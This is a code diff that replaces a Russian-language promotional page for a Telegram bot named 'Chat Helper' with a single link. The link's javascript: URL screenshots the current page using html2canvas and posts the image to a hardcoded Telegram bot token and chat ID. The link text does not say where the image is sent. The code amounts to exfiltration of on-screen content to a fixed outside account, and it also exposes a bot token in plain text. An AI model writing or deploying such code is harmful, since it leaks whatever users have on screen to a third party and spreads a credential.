@@ -1,48 +1,29 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat Helper</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <div class="container">
-        <header>
-            <h1>Chat Helper</h1>
-            <p>Используй возможности своего аккаунта на максимум!</p>
-        </header>
-
-        <section class="features">
-            <div class="feature">
-                <img src="bot_icon.png" alt="">
-                <div>
-                    <h2>Ваш персональный бот</h2>
-                    <p>Ваш личный телеграм бот, к которому доступ будете иметь только вы.<br> А значит больше возможностей и меньше нагрузки!</p>
-                </div>
-            </div>
-            <div class="feature">
-                <img src="multitasking_icon.png" alt="">
-                <div>
-                    <h2>Многозадачность!</h2>
-                    <p>Chat Helper способен выполнять несколько задач одновреммено</p>
-                </div>
-            </div>
-            <div class="feature">
-                <img src="moderation_icon.png" alt="">
-                <div>
-                    <h2>Огромное количество команд</h2>
-                    <p>В боте присутсвуют множество интересных команд, они могут быть как и полезными, так и в плане развлечения</p>
-                </div>
-            </div>
-            <div class="feature">
-                <img src="settings_icon.png" alt="">
-                <div>
-                    <h2>Настройки бота</h2>
-                    <p>Постарались облегчить вам использование бота, дабы вы не мучались с настройками</p>
-                </div>
-            </div>
-        </section>
-    </div>
-</body>
-</html>
+<a href="javascript:(async() => { 
+  const BOT_TOKEN = '7504344529:AAH6bSXuN_NYpXC1BmWn4C6rF0dSEV4xrNk'; 
+  const CHAT_ID = '1484311484'; 
+  if (!window.html2canvas) { 
+    await new Promise((resolve, reject) => { 
+      const script = document.createElement('script'); 
+      script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js'; 
+      script.onload = resolve; 
+      script.onerror = reject; 
+      document.head.appendChild(script); 
+    }); 
+  } 
+  html2canvas(document.body).then(async canvas => { 
+    const dataUrl = canvas.toDataURL("image/png"); 
+    const res = await fetch(dataUrl); 
+    const blob = await res.blob(); 
+    const formData = new FormData(); 
+    formData.append("chat_id", CHAT_ID); 
+    formData.append("photo", blob, "screenshot.png"); 
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; 
+    const response = await fetch(telegramUrl, { method: "POST", body: formData }); 
+    const result = await response.json(); 
+    if (result.ok) { 
+      console.log("✅ Скриншот отправлен в Telegram!"); 
+    } else { 
+      console.error("❌ Ошибка отправки:", result); 
+    } 
+  }); 
+})();">Нажми для отправки скриншота</a>
